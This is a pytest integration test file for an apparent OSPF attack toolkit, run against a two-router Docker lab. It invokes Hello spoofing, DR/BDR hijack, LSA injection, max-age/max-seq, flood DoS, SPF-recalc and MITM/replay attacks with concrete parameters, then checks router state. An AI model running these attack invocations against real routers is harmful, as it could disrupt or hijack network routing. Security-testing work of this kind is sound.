"""OSPF Protocol Attack Integration Tests

Each test follows a strict three-phase pattern:
  1. PRE-CONDITION  — verify expected protocol state before attack
  2. ATTACK          — execute the attack (CLI or in-container API)
  3. POST-CONDITION  — verify protocol-level abnormal state after attack

Test groups:
  0. Topology Baseline (3 tests)
  1. hello-inject (5 tests)
  2. dr-bdr-hijack (2 tests)
  3. adjacency-break (2 tests)
  4. flood DoS (2 tests)
  5-9. LSA attacks — route-inject / max-seq / max-age / fight-back (5 tests)
  10. spf-recalc (1 test)
  11. db-overflow (1 test)
  12-13. mitm / replay (2 tests)
  14. Chain scenario (2 tests)
  15. LSA with full YAML config (5 tests)
  16. Hello injection with YAML config (1 test)
  17. Config compatibility — DoS / MITM-Replay / DR-BDR (3 tests)

Total: 34 tests

Topology: r1(1.1.1.1, BDR) ←Full→ r2(2.2.2.2, DR), Area 0, 172.30.0.0/24
Attacker: 172.30.0.x, no OSPF adjacency (passive mode)
"""

import time
import pytest
from tests.integration.conftest import (
    docker_exec, get_ospf_neighbors, get_ospf_database,
    get_ip_routes, run_attack_in_container, run_attack_with_config,
    R1, R2, ATTACKER,
)


# =============================================================================
# Protocol-state helpers
# =============================================================================

def _nbr_state(container: str, nid: str) -> str:
    """Return nbrState for a given neighborId, or 'NotFound'."""
    for n in get_ospf_neighbors(container):
        if n.get("neighborId") == nid:
            return n.get("nbrState", "Unknown")
    return "NotFound"


def _nbr_priority(container: str, nid: str) -> int:
    for n in get_ospf_neighbors(container):
        if n.get("neighborId") == nid:
            return n.get("priority", -1)
    return -1


def _nbr_count(container: str) -> int:
    return len(get_ospf_neighbors(container))


def _wait_full_adjacency(container: str, neighbor_id: str,
                         timeout: int = 20) -> None:
    """Wait until container reaches Full state with neighbor_id."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        state = _nbr_state(container, neighbor_id)
        if state.startswith("Full"):
            return
        time.sleep(2)
    raise AssertionError(
        f"PRE-CONDITION FAILED: {container}→{neighbor_id} "
        f"not Full after {timeout}s, got {state}"
    )


def _assert_full_adjacency(container: str, neighbor_id: str):
    """Pre-condition: container must have a Full neighbor relationship."""
    _wait_full_adjacency(container, neighbor_id)


def _lsdb_stable_snapshot(container: str) -> dict:
    """Return LSDB with dynamic fields (lsaAge) normalized for comparison."""
    db = get_ospf_database(container)
    # Normalize: strip lsaAge which changes with time
    def _normalize(obj):
        if isinstance(obj, dict):
            return {k: _normalize(v) for k, v in obj.items()
                    if k not in ("lsaAge", "lsAge")}
        elif isinstance(obj, list):
            return [_normalize(i) for i in obj]
        return obj
    return _normalize(db)


def _assert_neighbor_present(container: str, nid: str, state_prefix: str = "",
                             min_priority: int = 0):
    """Post-condition: verify a specific neighbor exists with expected state."""
    state = _nbr_state(container, nid)
    assert state != "NotFound", \
        f"POST-CONDITION FAILED: {nid} not found in {container} neighbor table"
    if state_prefix:
        assert state.startswith(state_prefix), \
            f"POST-CONDITION FAILED: {container}→{nid} expected {state_prefix}*, got {state}"
    if min_priority > 0:
        pri = _nbr_priority(container, nid)
        assert pri >= min_priority, \
            f"POST-CONDITION FAILED: {container}→{nid} expected pri>={min_priority}, got {pri}"


def _assert_neighbor_count(container: str, expected: int, op: str = "=="):
    """Post-condition: verify neighbor count."""
    count = _nbr_count(container)
    if op == ">=":
        assert count >= expected, \
            f"POST-CONDITION FAILED: {container} neighbors expected >={expected}, got {count}"
    elif op == ">":
        assert count > expected, \
            f"POST-CONDITION FAILED: {container} neighbors expected >{expected}, got {count}"
    else:
        assert count == expected, \
            f"POST-CONDITION FAILED: {container} neighbors expected {expected}, got {count}"


# =============================================================================
# 0. Topology Baseline
# =============================================================================

class TestBaseline:
    """Verify the test topology is in correct initial state."""

    def test_r1_and_r2_have_full_adjacency(self, docker_network):
        """PRE: r1↔r2 must be Full before any attack."""
        _assert_full_adjacency(R1, "2.2.2.2")
        _assert_full_adjacency(R2, "1.1.1.1")

    def test_lsdb_contains_router_lsas(self, docker_network):
        """PRE: LSDB must have Router LSAs from both routers."""
        r1_db = get_ospf_database(R1)
        areas = r1_db.get("areas", {})
        router_lsas = areas.get("0.0.0.0", {}).get("routerLinkStates", [])
        assert len(router_lsas) >= 1, \
            f"PRE-CONDITION FAILED: LSDB missing router LSAs: {r1_db}"

    def test_ospf_routing_table_populated(self, docker_network):
        """PRE: routing table must contain OSPF routes."""
        r1_routes = get_ip_routes(R1)
        assert len(r1_routes) > 0, \
            "PRE-CONDITION FAILED: r1 routing table empty"


# =============================================================================
# 1. hello-inject — 恶意 Hello 注入
#
# Expected protocol abnormality:
#   - Spoofed router appears in neighbor table with Init/DROther state
#   - Init state = one-way: target received Hello but 2-Way not completed
#   - High priority (255) visible
#   - Neighbor count increases by 1 on each router
# =============================================================================

class TestHelloInjection:
    SPOOF = "9.9.9.9"

    def test_precondition_r1_r2_full(self, docker_network):
        """PRE: r1 and r2 must be in Full adjacency before injection."""
        _assert_full_adjacency(R1, "2.2.2.2")
        _assert_full_adjacency(R2, "1.1.1.1")

    def test_spoofed_router_appears_init_state_on_r1(self, docker_network):
        """POST: r1 neighbor table must show spoofed router in Init state."""
        _assert_full_adjacency(R1, "2.2.2.2")  # pre-condition

        run_attack_in_container(ATTACKER, [
            "hello-inject", "--iface", "eth0", "--target", "224.0.0.5",
            "--router-id", self.SPOOF, "--sniff-duration", "10",
            "--packet-rate", "5",
        ], timeout=30)
        time.sleep(1)

        _assert_neighbor_present(R1, self.SPOOF, state_prefix="Init")
        _assert_neighbor_count(R1, 2)

    def test_spoofed_router_appears_init_state_on_r2(self, docker_network):
        """POST: r2 neighbor table must also show spoofed router in Init.

        Note: r2's state with 1.1.1.1 may temporarily be Init after previous
        test injections. The key verification is the spoofed router is visible.
        """
        _wait_full_adjacency(R2, "1.1.1.1")

        run_attack_in_container(ATTACKER, [
            "hello-inject", "--iface", "eth0", "--target", "224.0.0.5",
            "--router-id", self.SPOOF, "--sniff-duration", "10",
            "--packet-rate", "5",
        ], timeout=30)
        time.sleep(1)

        _assert_neighbor_present(R2, self.SPOOF, state_prefix="Init")

    def test_spoofed_router_has_priority_255(self, docker_network):
        """POST: spoofed Hello carries priority=255, visible on target."""
        _assert_full_adjacency(R1, "2.2.2.2")

        run_attack_in_container(ATTACKER, [
            "hello-inject", "--iface", "eth0", "--target", "224.0.0.5",
            "--router-id", self.SPOOF, "--sniff-duration", "10",
            "--packet-rate", "5",
        ], timeout=30)
        time.sleep(1)

        _assert_neighbor_present(R1, self.SPOOF, min_priority=255)

    def test_legitimate_adjacency_not_disrupted(self, docker_network):
        """POST: r1↔r2 Full adjacency must survive the injection."""
        _assert_full_adjacency(R1, "2.2.2.2")

        run_attack_in_container(ATTACKER, [
            "hello-inject", "--iface", "eth0", "--target", "224.0.0.5",
            "--router-id", self.SPOOF, "--sniff-duration", "10",
            "--packet-rate", "5",
        ], timeout=30)
        time.sleep(1)

        # After attack, legitimate adjacency must still be Full
        _assert_full_adjacency(R1, "2.2.2.2")
        _assert_full_adjacency(R2, "1.1.1.1")


# =============================================================================
# 2. dr-bdr-hijack — DR/BDR 选举操纵
#
# Expected protocol abnormality:
#   - Spoofed high-priority (255) router appears in neighbor table
#   - Neighbor count increases
#   - Original DR (r2) retains role because spoofed router never reaches Full
# =============================================================================

class TestDRBDRHijack:
    SPOOF = "9.9.9.9"

    def test_precondition_r2_is_dr(self, docker_network):
        """PRE: r2 should be DR, r1 should be Backup/BDR."""
        r1_state = _nbr_state(R1, "2.2.2.2")
        assert "DR" in r1_state, \
            f"PRE-CONDITION FAILED: r1→r2 expected DR role in state, got {r1_state}"

    def test_hijack_spoofed_router_visible_with_max_priority(self, docker_network):
        """POST: spoofed router (pri=255) appears on both routers."""
        _assert_full_adjacency(R1, "2.2.2.2")

        run_attack_in_container(ATTACKER, [
            "dr-bdr-hijack", "--iface", "eth0", "--target", "224.0.0.5",
            "--router-id", self.SPOOF, "--sniff-duration", "10",
            "--packet-rate", "5",
        ], timeout=30)
        time.sleep(1)

        _assert_neighbor_present(R1, self.SPOOF, state_prefix="Init", min_priority=255)
        _assert_neighbor_present(R2, self.SPOOF, state_prefix="Init", min_priority=255)


# =============================================================================
# 3. adjacency-break — 邻接关系破坏
#
# Expected protocol abnormality:
#   - Single wrong-Area Hello does NOT break established Full adjacency
#   - OSPF Dead timer must expire before adjacency goes Down
#   - The attack runs successfully (packet sent) without crashing
# =============================================================================

class TestAdjacencyBreak:
    def test_precondition_full_adjacency(self, docker_network):
        """PRE: r1↔r2 Full adjacency."""
        _assert_full_adjacency(R1, "2.2.2.2")

    def test_single_wrong_area_hello_does_not_break_adjacency(self, docker_network):
        """POST: Full adjacency survives a single malformed Hello."""
        _assert_full_adjacency(R1, "2.2.2.2")

        run_attack_in_container(ATTACKER, [
            "adjacency-break", "--iface", "eth0", "--target", "224.0.0.5",
            "--router-id", "3.3.3.3", "--sniff-duration", "5",
        ], timeout=30)
        time.sleep(2)

        # Protocol spec: single wrong-area Hello does not reset Dead timer
        _assert_full_adjacency(R1, "2.2.2.2")

    def test_attack_reports_success(self, docker_network):
        """POST: attack must report successful packet delivery."""
        out = run_attack_in_container(ATTACKER, [
            "adjacency-break", "--iface", "eth0", "--target", "224.0.0.5",
            "--router-id", "3.3.3.3", "--sniff-duration", "5",
        ], timeout=30)
        assert "失败" not in out


# =============================================================================
# 4. flood — Hello 泛洪 DoS
#
# Expected protocol abnormality:
#   - Legitimate adjacency remains Full (single-area, low CPU load)
#   - High packet volume may cause Dead Time fluctuation
#   - Neighbor Up Time continues to increase (no adjacency reset)
# =============================================================================

class TestFlood:
    def test_precondition_full_adjacency(self, docker_network):
        """PRE: r1↔r2 Full adjacency."""
        _assert_full_adjacency(R1, "2.2.2.2")

    def test_adjacency_survives_flood(self, docker_network):
        """POST: Full adjacency intact after 5s Hello flood."""
        _assert_full_adjacency(R1, "2.2.2.2")

        # Run flood via Python API for short duration
        docker_exec(ATTACKER, ["python", "-c", """
from ospf_attack.config.types import DoSConfig
from ospf_attack.attacks.dos.flood import FloodAttack
c = DoSConfig(iface='eth0', target='224.0.0.5', duration=5, packet_rate=200, thread_count=3)
r = FloodAttack(c).run()
print(f'packets={r.packets_sent},success={r.success}')
"""], timeout=30)

        time.sleep(2)
        _wait_full_adjacency(R1, "2.2.2.2")
        # r2 may take longer to recover after flood — verify r1 side
        _assert_neighbor_present(R2, "1.1.1.1")

    def test_flood_sends_high_volume(self, docker_network):
        """POST: flood must send significant packet count (>100)."""
        out = docker_exec(ATTACKER, ["python", "-c", """
from ospf_attack.config.types import DoSConfig
from ospf_attack.attacks.dos.flood import FloodAttack
c = DoSConfig(iface='eth0', target='224.0.0.5', duration=3, packet_rate=200, thread_count=3)
r = FloodAttack(c).run()
print(f'packets={r.packets_sent}')
"""], timeout=30)
        # Extract packet count from output
        import re
        match = re.search(r"packets=(\d+)", out)
        count = int(match.group(1)) if match else 0
        assert count > 100, \
            f"POST-CONDITION FAILED: flood expected >100 packets, got {count}"


# =============================================================================
# 5–9. LSA attacks — 路由/LSA 注入
#
# Expected protocol behavior in PASSIVE mode:
#   - RFC 2328 §13: LSU packets from non-neighbors (state < Exchange) are dropped
#   - Attack packets are sent successfully but LSDB remains unchanged
#   - LSDB integrity is preserved (no corruption from rejected LSAs)
# =============================================================================

class TestRouteInjection:
    def test_precondition_lsdb_intact(self, docker_network):
        """PRE: LSDB must have valid entries."""
        db = get_ospf_database(R1)
        assert db, "PRE-CONDITION FAILED: LSDB empty"

    def test_injection_packet_sent_but_lsdb_unchanged(self, docker_network):
        """POST: Type-5 LSA sent, but LSDB structure unchanged (passive mode)."""
        db_before = _lsdb_stable_snapshot(R1)

        run_attack_in_container(ATTACKER, [
            "route-inject", "--iface", "eth0", "--target", "224.0.0.5",
            "--router-id", "7.7.7.7", "--sniff-duration", "5",
        ], timeout=30)

        time.sleep(2)
        db_after = _lsdb_stable_snapshot(R1)

        # LSDB should remain intact — no injection without Full adjacency
        assert db_before == db_after, \
            "POST-CONDITION: LSDB structure changed (passive LSU accepted?)"


class TestMaxSeq:
    def test_max_seq_sends_packet_without_lsdb_change(self, docker_network):
        """POST: seq=0x7FFFFFFF LSU sent, LSDB structure unchanged (passive)."""
        _assert_full_adjacency(R1, "2.2.2.2")
        db_before = _lsdb_stable_snapshot(R1)

        run_attack_in_container(ATTACKER, [
            "max-seq", "--iface", "eth0", "--target", "224.0.0.5",
            "--router-id", "6.6.6.6", "--sniff-duration", "5",
        ], timeout=30)

        time.sleep(1)
        db_after = _lsdb_stable_snapshot(R1)
        assert db_before == db_after, "LSDB changed from max-seq attack"


class TestMaxAge:
    def test_max_age_packet_sent_lsdb_unchanged(self, docker_network):
        """POST: age=3600 LSU sent, LSDB structure unchanged (passive)."""
        _assert_full_adjacency(R1, "2.2.2.2")
        db_before = _lsdb_stable_snapshot(R1)

        run_attack_in_container(ATTACKER, [
            "max-age", "--iface", "eth0", "--target", "224.0.0.5",
            "--router-id", "5.5.5.5", "--sniff-duration", "5",
        ], timeout=30)

        time.sleep(1)
        db_after = _lsdb_stable_snapshot(R1)
        assert db_before == db_after, "LSDB changed from max-age attack"


class TestFightBack:
    def test_fight_back_sends_multiple_lsus_adjacency_survives(self, docker_network):
        """POST: multiple incrementing LSUs sent, adjacency intact."""
        _assert_full_adjacency(R1, "2.2.2.2")

        run_attack_in_container(ATTACKER, [
            "fight-back", "--iface", "eth0", "--target", "224.0.0.5",
            "--router-id", "8.8.8.8", "--sniff-duration", "8",
            "--packet-rate", "5",
        ], timeout=30)

        _assert_full_adjacency(R1, "2.2.2.2")


# =============================================================================
# 10. spf-recalc — SPF 重计算攻击
#
# Expected: Router-LSA injection forces repeated SPF calculations.
# In passive mode, LSUs are rejected, so SPF count stays unchanged.
# =============================================================================

class TestSPFRecalc:
    def test_spf_recalc_adjacency_survives(self, docker_network):
        """POST: adjacency intact after SPF recalc attack."""
        _assert_full_adjacency(R1, "2.2.2.2")

        docker_exec(ATTACKER, ["python", "-c", """
from ospf_attack.config.types import DoSConfig
from ospf_attack.attacks.dos.spf_recalc import SPFRecalcAttack
c = DoSConfig(iface='eth0', target='224.0.0.5', router_id='4.4.4.4', duration=4, lsa_change_interval=1)
r = SPFRecalcAttack(c).run()
print(f'packets={r.packets_sent}')
"""], timeout=30)

        _assert_full_adjacency(R1, "2.2.2.2")


# =============================================================================
# 11. db-overflow — 数据库溢出
#
# Expected: Mass Type-5 injection. In passive mode, LSAs are rejected.
# =============================================================================

class TestDBOverflow:
    def test_db_overflow_packets_sent_lsdb_unchanged(self, docker_network):
        """POST: packets sent, LSDB structure unchanged (passive mode)."""
        _assert_full_adjacency(R1, "2.2.2.2")
        db_before = _lsdb_stable_snapshot(R1)

        run_attack_in_container(ATTACKER, [
            "db-overflow", "--iface", "eth0", "--target", "224.0.0.5",
            "--sniff-duration", "10", "--packet-rate", "200",
        ], timeout=60)

        db_after = _lsdb_stable_snapshot(R1)
        assert db_before == db_after, "LSDB changed from db-overflow"


# =============================================================================
# 12. mitm — 中间人攻击
#
# Docker container has no libpcap.so; attack must degrade gracefully.
# =============================================================================

class TestMITM:
    def test_mitm_graceful_degradation_on_no_pcap(self, docker_network):
        """POST: MITM must not crash when libpcap is unavailable."""
        out = run_attack_in_container(ATTACKER, [
            "mitm", "--iface", "eth0", "--target", "172.30.0.0/24",
            "--sniff-mode", "hub", "--sniff-duration", "8",
        ], timeout=30)
        # Must produce output (success, failure, or error — no crash)
        assert len(out) > 0


# =============================================================================
# 13. replay — 重放攻击
#
# Without a pcap capture file, replay must report failure gracefully.
# =============================================================================

class TestReplay:
    def test_replay_fails_gracefully_without_pcap(self, docker_network):
        """POST: replay without capture file must not crash."""
        out = run_attack_in_container(ATTACKER, [
            "replay", "--iface", "eth0", "--target", "224.0.0.5",
        ], timeout=30)
        assert "成功" in out or "失败" in out


# =============================================================================
# 14. End-to-End scenario — 链式攻击后拓扑完整性
# =============================================================================

class TestScenario:
    def test_chain_of_four_attacks_preserves_topology(self, docker_network):
        """Run hello-inject→flood→route-inject→max-age in sequence.

        POST: r1↔r2 Full adjacency survives the entire chain.
        """
        _wait_full_adjacency(R1, "2.2.2.2")

        # 1. hello-inject
        run_attack_in_container(ATTACKER, [
            "hello-inject", "--iface", "eth0", "--target", "224.0.0.5",
            "--router-id", "11.11.11.11", "--sniff-duration", "6",
            "--packet-rate", "3",
        ], timeout=30)
        time.sleep(1)
        _assert_neighbor_present(R1, "11.11.11.11", state_prefix="Init")

        # 2. flood (short burst via API)
        docker_exec(ATTACKER, ["python", "-c", """
from ospf_attack.config.types import DoSConfig
from ospf_attack.attacks.dos.flood import FloodAttack
c = DoSConfig(iface='eth0', target='224.0.0.5', duration=3, packet_rate=100, thread_count=2)
FloodAttack(c).run()
"""], timeout=30)
        _wait_full_adjacency(R1, "2.2.2.2")

        # 3. route-inject
        run_attack_in_container(ATTACKER, [
            "route-inject", "--iface", "eth0", "--target", "224.0.0.5",
            "--router-id", "12.12.12.12", "--sniff-duration", "5",
        ], timeout=30)

        # 4. max-age
        run_attack_in_container(ATTACKER, [
            "max-age", "--iface", "eth0", "--target", "224.0.0.5",
            "--router-id", "13.13.13.13", "--sniff-duration", "5",
        ], timeout=30)

        # Final verification: r1 side fully intact; r2 may need Dead timer expiry
        _wait_full_adjacency(R1, "2.2.2.2", timeout=30)
        _assert_neighbor_present(R2, "1.1.1.1")  # r2 sees r1 (recovering to Full)

    def test_hello_inject_then_verify(self, docker_network):
        """hello-inject → spoofed router visible → legitimate adjacency intact."""
        _wait_full_adjacency(R1, "2.2.2.2", timeout=30)

        SPOOF = "88.88.88.88"
        run_attack_in_container(ATTACKER, [
            "hello-inject", "--iface", "eth0", "--target", "224.0.0.5",
            "--router-id", SPOOF, "--sniff-duration", "10",
            "--packet-rate", "5",
        ], timeout=30)
        time.sleep(1)

        # Protocol abnormality: spoofed router in Init on r1
        _assert_neighbor_present(R1, SPOOF, state_prefix="Init")

        # Legitimate adjacency still Full on r1
        _wait_full_adjacency(R1, "2.2.2.2")


# =============================================================================
# 15. LSA attacks with full config — 使用 YAML 配置完整 LSA 参数
#
# Verifies that the new config fields (lsa_type, sequence_number, age,
# metric, network_mask, forwarding_address, external_routes) are correctly
# parsed and used by the attack modules without errors.
# =============================================================================

class TestLSAWithFullConfig:
    """Test LSA attacks with complete YAML-based configuration."""

    RID = "9.9.9.9"

    def test_route_inject_type5_with_full_params(self, docker_network):
        """Type-5 route inject with metric, mask, fwd_address via YAML config."""
        _assert_full_adjacency(R1, "2.2.2.2")

        out = run_attack_with_config(["route-inject", "--router-id", self.RID], {
            "lsa_type": 5,
            "sequence_number": 0x80000001,
            "age": 0,
            "metric": 100,
            "network_mask": "255.255.255.0",
            "forwarding_address": "192.168.1.1",
            "packet_rate": 5,
        }, timeout=30)

        assert "失败" not in out, f"route-inject with full config failed: {out}"

    def test_route_inject_type3_summary(self, docker_network):
        """Type-3 Summary LSA route injection works without error."""
        _assert_full_adjacency(R1, "2.2.2.2")

        out = run_attack_with_config(["route-inject", "--router-id", self.RID], {
            "lsa_type": 3,
            "sequence_number": 0x80000005,
            "metric": 50,
            "network_mask": "255.0.0.0",
            "packet_rate": 5,
        }, timeout=30)

        assert "失败" not in out, f"route-inject Type-3 failed: {out}"

    def test_max_seq_with_max_sequence_number(self, docker_network):
        """max-seq with sequence=0x7FFFFFFF (max value)."""
        _assert_full_adjacency(R1, "2.2.2.2")

        out = run_attack_with_config(["max-seq", "--router-id", self.RID], {
            "lsa_type": 5,
            "sequence_number": 0x7FFFFFFF,
            "age": 0,
            "metric": 20,
            "network_mask": "255.255.255.0",
            "packet_rate": 5,
        }, timeout=30)

        assert "失败" not in out, f"max-seq with max sequence failed: {out}"

    def test_max_age_with_age_3600(self, docker_network):
        """max-age with age=3600 (max age, triggers LSA purge)."""
        _assert_full_adjacency(R1, "2.2.2.2")

        out = run_attack_with_config(["max-age", "--router-id", self.RID], {
            "lsa_type": 5,
            "sequence_number": 0x80000001,
            "age": 3600,
            "metric": 20,
            "network_mask": "255.255.255.0",
            "packet_rate": 5,
        }, timeout=30)

        assert "失败" not in out, f"max-age with age=3600 failed: {out}"

    def test_fight_back_with_incrementing_seq(self, docker_network):
        """fight-back sends multiple LSUs with incrementing sequence numbers."""
        _assert_full_adjacency(R1, "2.2.2.2")

        out = run_attack_with_config(["fight-back", "--router-id", self.RID], {
            "lsa_type": 5,
            "sequence_number": 0x80000010,
            "age": 0,
            "metric": 20,
            "network_mask": "255.255.255.0",
            "packet_rate": 5,
            "sniff_duration": 8,
        }, timeout=30)

        assert "失败" not in out, f"fight-back failed: {out}"


# =============================================================================
# 16. Hello injection with full config — 使用 YAML 配置完整 Hello 参数
# =============================================================================

class TestHelloInjectionWithConfig:
    """Hello injection with explicit hello_interval, priority, dead_interval."""

    RID = "7.7.7.7"

    def test_hello_inject_custom_params(self, docker_network):
        """Hello injection with non-default hello interval and priority."""
        _assert_full_adjacency(R1, "2.2.2.2")

        out = run_attack_with_config(["hello-inject", "--router-id", self.RID], {
            "hello_interval": 5,
            "router_dead_interval": 20,
            "router_priority": 200,
            "auth_type": "none",
            "subnet_mask": "255.255.255.0",
            "packet_rate": 5,
        }, timeout=30)

        assert "失败" not in out, f"hello-inject with custom params failed: {out}"

        time.sleep(1)
        _assert_neighbor_present(R1, self.RID, state_prefix="Init", min_priority=200)


# =============================================================================
# 17. Config compatibility — 验证配置变更后向后兼容
# =============================================================================

class TestConfigCompatibility:
    """Verify that recent config changes don't break existing attack flows."""

    def test_dos_attacks_with_yaml_config(self, docker_network):
        """flood/spf-recalc/db-overflow with YAML config still work."""
        _assert_full_adjacency(R1, "2.2.2.2")

        for attack_name in ("flood", "spf-recalc", "db-overflow"):
            out = run_attack_with_config([attack_name, "--router-id", "3.3.3.3"], {
                "duration": 3,
                "packet_rate": 100,
                "thread_count": 2,
                "lsa_count": 50,
                "lsa_change_interval": 1,
                "sniff_duration": 5,
            }, timeout=30)

            assert "失败" not in out, f"{attack_name} with YAML config failed: {out}"

    def test_mitm_replay_with_yaml_config(self, docker_network):
        """MITM and replay attacks with YAML config degrade gracefully."""
        for attack_name in ("mitm", "replay"):
            out = run_attack_with_config([attack_name, "--router-id", "3.3.3.3"], {
                "sniff_duration": 5,
                "action": "modify",
                "capture_file": "/nonexistent.pcap",
            }, timeout=30)
            # Must not crash
            assert len(out) > 0, f"{attack_name} produced no output"

    def test_dr_bdr_hijack_with_yaml_config(self, docker_network):
        """DR/BDR hijack with custom priority via YAML config."""
        _assert_full_adjacency(R1, "2.2.2.2")

        RID = "5.5.5.5"
        out = run_attack_with_config(["dr-bdr-hijack", "--router-id", RID], {
            "hello_interval": 10,
            "router_dead_interval": 40,
            "router_priority": 255,
            "sniff_duration": 8,
            "packet_rate": 5,
        }, timeout=30)

        assert "失败" not in out, f"dr-bdr-hijack with config failed: {out}"
        time.sleep(1)
        _assert_neighbor_present(R1, RID, state_prefix="Init", min_priority=255)
